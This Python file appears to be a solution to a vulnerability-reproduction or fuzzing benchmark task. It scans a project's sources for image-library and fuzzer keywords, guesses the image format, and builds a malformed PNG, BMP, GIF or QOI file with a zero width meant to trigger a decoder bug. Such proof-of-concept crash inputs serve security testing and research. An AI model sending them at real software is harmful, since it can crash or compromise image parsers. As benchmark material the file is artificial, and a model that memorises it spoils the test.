import os
import io
import re
import tarfile
import struct
import zlib
from typing import Dict, Tuple, List, Optional


class Solution:
    def _is_tarfile(self, path: str) -> bool:
        try:
            return tarfile.is_tarfile(path)
        except Exception:
            return False

    def _read_limited(self, f, limit: int) -> bytes:
        try:
            data = f.read(limit)
            return data if data is not None else b""
        except Exception:
            return b""

    def _scan_texts_from_dir(self, root: str) -> List[Tuple[str, str, bool]]:
        out = []
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".m", ".mm", ".rs", ".go", ".java", ".py"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                lfn = fn.lower()
                ext = os.path.splitext(lfn)[1]
                if ext not in exts:
                    continue
                try:
                    st = os.stat(path)
                except Exception:
                    continue
                if st.st_size <= 0:
                    continue
                if st.st_size > 2_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        b = self._read_limited(f, 400_000)
                except Exception:
                    continue
                try:
                    s = b.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                is_fuzzer = ("LLVMFuzzerTestOneInput" in s) or ("FuzzedDataProvider" in s) or ("fuzz" in lfn)
                out.append((path.lower(), s, is_fuzzer))
        return out

    def _scan_texts_from_tar(self, tar_path: str) -> List[Tuple[str, str, bool]]:
        out = []
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".m", ".mm", ".rs", ".go", ".java", ".py"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    ext = os.path.splitext(name)[1]
                    if ext not in exts:
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = self._read_limited(f, 400_000)
                    except Exception:
                        continue
                    try:
                        s = b.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    is_fuzzer = ("LLVMFuzzerTestOneInput" in s) or ("FuzzedDataProvider" in s) or ("fuzz" in os.path.basename(name))
                    out.append((name, s, is_fuzzer))
        except Exception:
            return []
        return out

    def _detect_format(self, src_path: str) -> str:
        texts: List[Tuple[str, str, bool]]
        if os.path.isdir(src_path):
            texts = self._scan_texts_from_dir(src_path)
        else:
            if self._is_tarfile(src_path):
                texts = self._scan_texts_from_tar(src_path)
            else:
                texts = []

        if not texts:
            return "png"

        fmt_keywords: Dict[str, List[str]] = {
            "png": [
                "spng_", "libspng", "lodepng", "png_read", "png_create_read_struct", "ihdr", "idat",
                "png", "stbi__png", "stbi_load_from_memory", "stb_image", "stbi_load",
                "magickreadimageblob", "imagemagick", "png.h", "libpng"
            ],
            "bmp": [
                "bmp", "bitmap", "dib", "bitmapinfoheader", "bitmapfileheader", "biwidth", "biheight"
            ],
            "gif": [
                "gif", "gif89a", "gif87a", "dgif", "egif", "giflib"
            ],
            "tiff": [
                "tiff", "libtiff", "tif_", "tiffreadencodedstrip", "tiffopen"
            ],
            "webp": [
                "webp", "vp8", "vp8x", "riff", "webpdecode"
            ],
            "j2k": [
                "openjpeg", "jpeg2000", "jp2", "j2k", "opj_"
            ],
            "avif": [
                "avif", "libavif", "heif", "libheif"
            ],
            "jxl": [
                "jxl", "jpeg xl", "libjxl"
            ],
            "qoi": [
                "qoi", "qoif"
            ],
        }

        def score_text(s: str, is_fuzzer: bool) -> Dict[str, int]:
            sl = s.lower()
            w = 8 if is_fuzzer else 1
            scores: Dict[str, int] = {k: 0 for k in fmt_keywords}
            for fmt, kws in fmt_keywords.items():
                sc = 0
                for kw in kws:
                    if kw in sl:
                        sc += 1
                scores[fmt] += sc * w
            return scores

        total_scores: Dict[str, int] = {k: 0 for k in fmt_keywords}

        for _, s, is_fuzzer in texts:
            ss = score_text(s, is_fuzzer)
            for k, v in ss.items():
                total_scores[k] += v

        best_fmt = "png"
        best_score = total_scores.get(best_fmt, 0)

        for k, v in total_scores.items():
            if v > best_score:
                best_score = v
                best_fmt = k

        if best_score <= 0:
            return "png"
        return best_fmt

    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
        ln = struct.pack(">I", len(data))
        crc = zlib.crc32(ctype)
        crc = zlib.crc32(data, crc) & 0xFFFFFFFF
        return ln + ctype + data + struct.pack(">I", crc)

    def _make_png_zero_dim(self, width: int, height: int) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)  # 8-bit RGBA
        # Each row: filter byte + rowbytes; if width==0 => rowbytes==0 => only filter byte per row.
        raw = b"\x00" * max(0, height)
        comp = zlib.compress(raw, 9)
        png = sig
        png += self._png_chunk(b"IHDR", ihdr)
        png += self._png_chunk(b"IDAT", comp)
        png += self._png_chunk(b"IEND", b"")
        return png

    def _make_bmp_zero_dim(self, width: int, height: int) -> bytes:
        # Minimal BMP with BITMAPINFOHEADER. 24bpp, no pixel data.
        file_header_size = 14
        dib_size = 40
        offset = file_header_size + dib_size
        file_size = offset  # no pixel data
        bf = b"BM" + struct.pack("<IHHI", file_size, 0, 0, offset)
        bi = struct.pack(
            "<IIIHHIIIIII",
            dib_size,
            width & 0xFFFFFFFF,
            height & 0xFFFFFFFF,
            1,
            24,
            0,
            0,
            0,
            0,
            0,
            0,
        )
        return bf + bi

    def _make_gif_zero_dim(self, width: int, height: int) -> bytes:
        # Minimal GIF89a with GCT (2 colors) and a single image block.
        header = b"GIF89a"
        lsd = struct.pack("<HH", width & 0xFFFF, height & 0xFFFF)
        packed = bytes([0x80 | 0x00 | 0x00])  # GCT flag set, color res=0, sort=0, GCT size=2 colors
        bg = b"\x00"
        aspect = b"\x00"
        gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"
        img_sep = b"\x2C"
        img_desc = struct.pack("<HHHH", 0, 0, width & 0xFFFF, height & 0xFFFF) + b"\x00"
        lzw_min = b"\x02"
        # LZW data with clear code (4) and end code (5) at code size 3 -> packed into one byte 0x2C
        img_data = b"\x01" + b"\x2C" + b"\x00"
        trailer = b"\x3B"
        return header + lsd + packed + bg + aspect + gct + img_sep + img_desc + lzw_min + img_data + trailer

    def _make_qoi_zero_dim(self, width: int, height: int) -> bytes:
        # QOI header + end marker.
        header = b"qoif" + struct.pack(">II", width & 0xFFFFFFFF, height & 0xFFFFFFFF) + bytes([3, 0])
        end = b"\x00\x00\x00\x00\x00\x00\x00\x01"
        return header + end

    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)

        # Try to trigger by setting one dimension to zero while keeping the other >0.
        if fmt == "bmp":
            return self._make_bmp_zero_dim(0, 2)
        if fmt == "gif":
            return self._make_gif_zero_dim(0, 2)
        if fmt == "qoi":
            return self._make_qoi_zero_dim(0, 2)
        # Default / png-like decoders (including generic image loaders)
        return self._make_png_zero_dim(0, 2)